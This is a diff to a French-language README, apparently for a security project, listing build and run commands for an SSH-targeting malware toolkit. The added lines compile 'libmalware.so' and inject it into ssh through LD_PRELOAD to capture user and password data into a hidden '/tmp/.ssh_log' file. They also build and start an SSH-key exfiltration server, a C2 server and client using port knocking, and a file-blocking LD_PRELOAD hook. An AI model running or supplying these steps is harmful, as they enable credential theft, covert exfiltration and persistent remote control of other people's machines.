@@ -55,25 +55,40 @@ Donc un thread est beaucoup plus judicieux qu'un processus complet car moins co�
 Commandes linux notables :
 
 ### Suivre la trace de la connexion ssh  
-``` strace -o toto.txt ssh username@IP-address```
+```strace -o toto.txt ssh username@IP```
 
-### Compiler et créer notre bibliothèque partagée
-```gcc -fPIC -shared -o lib.so code.c```
+### Compiler et créer credential.c
+```gcc -shared -fPIC -o libmalware.so malware.c -ldl```
+_Connexion pour l'extraction des données passwd/utilisateur_
+```LD_PRELOAD=./libmalware.so ssh username@IP```
+_Chemin du fichier d'extraction_
+```/tmp/.ssh_log```
 
 ### Lancer la connexion ssh avec LD_PRELOAD pour charger NOTRE bibliothèque
-```  LD_PRELOAD=./libmalware.so ssh username@IPaddress```
+```LD_PRELOAD=./libmalware.so ssh username@IP```
 
 ### Modifier les fichiers de config ssh  
 ```nano /etc/ssh/sshd_config```
 ```nano /etc/pam.d/sshd```
 
-### permet de compiler et lancer le serveur 
+### Permet de compiler et lancer le serveur d'exfiltration des clé ssh
 ```gcc -o ssh_serv ssh_serv.c```
 ```./ssh_serv```
+_Dans la ligne de commande client_
+```gcc -o ssh_log.so ssh_log.c -shared -fPIC -ldl```
+Se connecter en SSH, exit, puis 'cat extraction.txt' afin de voir le fichier d'extraction.
 
 
+### Compilation de notre C2_server
+```gcc -o c2_server c2_server.c port_knocking.c -lpthread```
+```./c2_server```
+_Dans la ligne de commande client_ 
+```gcc c2_client.c -o c2_client```
+```./c2_client```
 
-
+### Compilation du blocage de fichier
+```gcc -shared -o hook_files.so hook_files.c -fPIC -ldl```
+```export LD_PRELOAD=$PWD/hook_files.so```
 
 
 
